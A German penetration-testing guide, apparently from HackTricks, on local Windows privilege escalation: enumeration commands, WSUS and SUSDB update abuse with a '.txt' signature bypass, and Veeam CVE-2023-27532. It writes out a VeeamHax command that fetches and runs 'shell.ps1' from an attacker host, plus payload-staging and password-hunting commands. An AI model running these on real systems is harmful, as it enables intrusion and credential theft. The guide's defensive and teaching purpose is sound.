# Windows-Rechteausweitung mit lokalen Berechtigungen

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden lokaler Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Windows-Rechteausweitung aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Workshops und Checklisten aus der Community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Windows-Rechteausweitung.<sup>[[5]](#references)</sup>

## Grundlegende Windows-Theorie

### Zugriffstoken

**Wenn du nicht weißt, was Windows-Zugriffstoken sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs – DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs – DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen in Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

In Windows gibt es verschiedene Dinge, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und all diese **Abwehrmechanismen enumerieren**, bevor du mit der Enumeration zur Rechteausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann auch eine Offline-Änderung des UEFI-NVRAM in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Speicher-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Eingabeaufforderungen High IL zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Den speziellen UIAccess-/Admin-Protection-Bypass-Ablauf findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Registry-Weitergabe von Barrierefreiheitseinstellungen des Secure Desktop kann für einen beliebigen SYSTEM-Registry-Schreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Pfad über **SMB auf beliebigen Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

Informationen zur lokalen Bestandsaufnahme aus einer bestehenden PowerShell-Sitzung findest du unter [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Diese Beispiele ergänzen die folgenden Prüfungen, ohne separate Enumeration-Programme zu starten.

### Enumeration von Versionsinformationen

Prüfe, ob für die Windows-Version bekannte Schwachstellen existieren (überprüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Site](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt damit die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson integriert)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und mögliche Kandidaten aus ausgewählten Sicherheitsmeldungen; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Bei einem versionsspezifischen lokalen Exploit solltest du sowohl die **Architektur des laufenden Prozesses** als auch die Architektur des OS prüfen. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein fehlendes KB-Update beweist nicht, dass ein Exploit funktioniert; vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Voraussetzungen des Exploits mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) zum genauen Problem.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [clientgesteuerte Offsets im MIDI-Ringpuffer für gemeinsam genutzten Speicher](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build; `LOCAL SERVICE` zu erreichen ist ein separater Schritt von der anschließenden [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)-Eskalation zu `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten oder sonstige nützliche Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Wie Sie dies aktivieren, erfahren Sie hier: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt Dateien normalerweise im Documents-Ordner jedes Benutzers, aber eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann Dateien in einen gemeinsam genutzten oder versteckten Ordner umleiten. Prüfen Sie den effektiven Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript überprüfen: Es kann Befehlsargumente und Ausgaben enthalten, einschließlich Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipeline-Ausführungen werden protokolliert, darunter ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, folgen Sie den Anweisungen im Abschnitt „Transkriptdateien“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus den PowerShell-Protokollen anzuzeigen, kannst du Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsdatensatz der Skriptausführung wird erfasst, sodass jeder Codeblock während der Ausführung dokumentiert wird. Dadurch bleibt ein umfassender Audit-Trail aller Aktivitäten erhalten, der für die Forensik und die Analyse bösartiger Verhaltensweisen wertvoll ist. Die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung ermöglicht detaillierte Einblicke in den Prozess.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logging-Ereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter folgendem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die frühere Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt zur Prüfung auf das Abfangen von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und von den Vertrauens- und Installationsrichtlinien des Clients für Updates. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zuerst prüfen Sie, ob das Netzwerk ein WSUS-Update ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder das Folgende in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist es ausnutzbar.** Wenn der letzte Registry-Wert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Abfangpfad bestätigt. Es beweist jedoch nicht, dass ein Abfangen, die Annahme eines schädlichen Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert auf `0` gesetzt ist, wird dieser konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um für MiTM-Angriffe präparierte Exploit-Skripte, mit denen sich „gefälschte“ Updates in nicht per SSL geschützten WSUS-Datenverkehr einschleusen lassen.

Lesen Sie die Recherche hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lesen Sie den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen nutzt dieser Bug folgende Schwachstelle aus:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und Code mit erhöhten Rechten auf unserem Zielsystem ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und es dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Validierung nach dem Prinzip „Trust on First Use“ für das Zertifikat umzusetzen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben wurde).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen. Ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung für die Veröffentlichung](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das betreffende Update signiert und akzeptiert wird, auf das Ziel anwendbar ist und in einem privilegierteren Kontext installiert wird, bevor Sie dies als Eskalationspfad einstufen. Ein HTTP-Wert für `WUServer` oder ein Gruppenname allein belegt nicht, dass diese Bedingungen erfüllt sind.

### Missbrauch benutzerdefinierter SUSDB-Updates: unsignierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist das Weiterleiten eines WSUS-Computerkontos an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der jeweiligen Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Weiterleitung an die externe Datenbank und Prozedurberechtigungen bestätigen

Prüfen Sie bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, zunächst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob die NTLM-Weiterleitung diesen Listener erreicht. Die SQL-Rolle des Servers kann Prozeduren zur Veröffentlichung von Updates verfügbar machen, selbst wenn direkte Schreibzugriffe auf Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass die Veröffentlichung blockiert ist. Prüfen Sie die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen in einer autorisierten SQL-Sitzung, bevor Sie versuchen, ein benutzerdefiniertes Update zu veröffentlichen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind nützlich, um gültige Update-Metadaten zu rekonstruieren. Sowohl ein Bundle-Parent als auch ein Payload-Child benötigen `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`); erfasse die lokale Revisions-ID, die bei jedem Aufruf von `spImportUpdate` zurückgegeben wird, und halte die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent. Dies ist ein zustandsbehafteter Publishing-Workflow, daher ist ein einzelner erfolgreicher Aufruf einer gespeicherten Prozedur kein Beweis für eine clientseitige Ausführung.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Custom-Update-Workflow verwendet legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Content-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten/Fragmenten übereinstimmen. Nachdem die Content-URL und die Zielgruppe festgelegt wurden, sieht die abschließende Genehmigung etwa wie folgt aus; verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS weist beliebige unsignierte ausführbare Inhalte normalerweise zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` das Flag für die Zertifikatsprüfung jedoch auf false, wenn der angegebene Dateiname auf `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne zuvor zu prüfen, ob die Bytes Text oder ein gültiges ESD-Image sind. Daher kann eine unveränderte PE-Datei mit einem Namen wie `payload.exe.txt` die Inhaltsprüfung bestehen und später vom Installationshandler der Update-Befehlszeile gestartet werden. Dies ist ein Policy-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Durch Aufrufen von `spDeployUpdate` ruft WSUS den registrierten Inhalt ab. Der Ursprung muss die HTTP-Erwartungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt beim WSUS-Synchronisieren `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Forschungs-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das SQL, das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette benötigt wird, enthält einen modifizierten MSSQL-Client zur Ausführung und liefert `BitsWebServer.py` für das Staging von Inhalten mit. Ein minimaler Aufruf in einem autorisierten Labor sieht so aus:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die Interaktion auf Clientseite hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort erneut angeboten, nachdem der Callback-Prozess beendet war. Wiederholungsversuche können so zu wiederkehrender Ausführungspersistenz führen; dies ist auffällig, weil der Client einen Status für ein fehlgeschlagenes Update anzeigt.<sup>[[39]](#references)</sup>

#### Ansatzpunkte für Erkennung und Härtung

Nützliche Ansatzpunkte auf Server- und Clientseite entlang dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Zielgruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` sowie von unerwarteten Principals (insbesondere Nicht-Computer-Konten) vorgenommene Deployments untersuchen.
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, das falsch geschriebene `FileVerficationFailed` und `EventId=364` überprüfen; die Verifizierung anhand der Payload-Erweiterung und des Content-Magic-Werts abgleichen, statt dem Suffix zu vertrauen.
- Wiederholt fehlschlagende bzw. erneut gestartete Windows-Update-Installationen sowie PE-Ausführung oder unerwartete Child-/Netzwerkaktivitäten durch Inhalte mit `.txt`- oder `.esd`-Namen aufspüren.
- Sofern unterstützt, Extended Protection for Authentication für den Datenbankdienst erzwingen und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Rechte für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agents bieten eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal. Wenn die Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer rogue Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Recon-Hinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version bestätigen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Advisory](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Zugangsdaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann über localhost hinaus gebunden sein. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patch-Prüfung.
- **Erste behobene Versionen**: Veeam führt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste behobene Releases auf; frühere Releases sind betroffen. Anhand einer vierteiligen Dateiversion allein lässt sich ein ungepatchter Basis-Build nicht von einem späteren Patch auf denselben Build-Nummern unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als behoben einstufen.
- **Exploit**: Legen Sie ein PoC wie `VeeamHax.exe` zusammen mit den benötigten Veeam-DLLs im selben Verzeichnis ab und lösen Sie dann über den lokalen Socket einen SYSTEM-Payload aus:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC demonstriert die Ausführung von Befehlen als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Herstellers beschreibt das Problem der Offenlegung von Zugangsdaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Schwachstelle zur **local privilege escalation**. Dazu gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über Self-Rights verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer in der Domäne erstellen dürfen. Wichtig ist, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos-Relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Verzeichnisschreibzugriff führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal über Rechte am Zielobjekt verfügt. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) sowohl RBCD- als auch `msDS-KeyCredentialLink`-LDAP-Schreibvorgänge (Shadow Credentials); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert die entsprechenden Delegierungs- und Zielobjektrechte, während eine Shadow-Credential-Kette Schreibrechte für Key Credentials sowie einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

